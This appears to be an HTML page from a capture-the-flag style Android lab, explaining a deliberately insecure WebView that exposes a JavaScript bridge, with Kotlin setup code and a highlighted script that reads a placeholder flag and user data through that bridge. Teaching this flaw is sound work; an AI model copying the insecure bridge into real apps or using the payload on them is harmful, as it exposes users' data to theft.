@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Vulnerable WebView — Details</title>
+    <style>
+        body { background:#141414; color:#3AFF7A; font-family: 'Courier New', monospace; padding:18px; }
+        h1 { color:#FFD95F; margin-bottom:6px }
+        .card { background:#1a1a1a; border:2px solid #3AFF7A; padding:18px; border-radius:8px; max-width:900px }
+        pre { background:#0a0a0a; padding:12px; border-radius:6px; overflow:auto; color:#c8ffde; }
+        .muted { color:#9beeb0; opacity:0.9 }
+        .highlight { color:#000; background:#3AFF7A; padding:0 6px; border-radius:3px }
+        .xss-line { color:#FFD95F; background:rgba(255,217,95,0.06); display:inline-block; padding:2px 6px; border-radius:4px }
+        .btn { display:inline-block; margin-top:14px; padding:10px 14px; color:#000; background:#3AFF7A; border-radius:6px; text-decoration:none; font-weight:bold }
+        .note { margin-top:10px; color:#9beeb0 }
+        code.k { color:#FFD95F }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Vulnerable WebView Implementation</h1>
+        <div class="muted">This page shows the vulnerable parts of the mobile app's WebView integration, explains why it's dangerous, and highlights the JavaScript line used to access the Android bridge.</div>
+
+        <h2 style="margin-top:14px">1) The exposed bridge methods (Kotlin)</h2>
+        <pre><code>// In `WebAppInterface` (Kotlin)
+@JavascriptInterface
+fun getFlag(): String {
+    return "PwnD{Not_the_real_flag}
+}
+
+@JavascriptInterface
+fun getUserObject(): JSONObject{
+    val userObject = JSONObject()
+    userObject.put("John", "Doe")
+        .put("age", 22)
+        .put("email", "john.doe@home.eg")
+        .put("phone number","01122334455")
+    return userObject
+}
+
+@JavascriptInterface
+fun showToast(message: String) {
+    Toast.makeText(mContext, message, Toast.LENGTH_LONG).show()
+}
+        </code></pre>
+
+        <h2 style="margin-top:12px">2) WebView setup (Kotlin)</h2>
+        <pre><code>// In the Activity creating the WebView
+webView.settings.javaScriptEnabled = true
+webView.settings.domStorageEnabled = true
+webView.addJavascriptInterface(WebAppInterface(this), "AndroidBridge")
+webView.loadUrl("http://10.0.2.2:4444/support")
+        </code></pre>
+
+        <h2 style="margin-top:12px">3) Why this is vulnerable</h2>
+        <div class="note">When the app uses <code class="k">addJavascriptInterface</code> with JavaScript enabled, any page loaded in that WebView can call the annotated methods on the provided object via the exposed name (here: <code class="k">AndroidBridge</code>). If the page is malicious (or contains an injected script), it can call those methods and exfiltrate secrets.</div>
+
+        <h2 style="margin-top:12px">4) Example internal JavaScript bridge calls</h2>
+        <pre><code>// Accessing bridge from page JS
+const flag = AndroidBridge.getFlag();        // <- reads secret string
+const user = AndroidBridge.getUserObject(); // <- reads user data object
+AndroidBridge.showToast('hello');
+        </code></pre>
+
+        <h2 style="margin-top:12px">5) The XSS / exploitation line (highlighted)</h2>
+        <div class="muted">A malicious page can simply call the bridge. The following single line is the key exploit payload that attempts to access the bridge:</div>
+        <pre><code>&lt;script&gt;
+    // Exploit payload: this line attempts to read the flag
+    <span class="xss-line">const stolenFlag = AndroidBridge.getFlag();</span>
+    // You can also attempt to read the user object
+    const stolenUser = AndroidBridge.getUserObject();
+&lt;/script&gt;
+        </code></pre>
+
+        <a class="btn" href="/insecure-webview">Try the Exploit →</a>
+    </div>
+</body>
+</html>
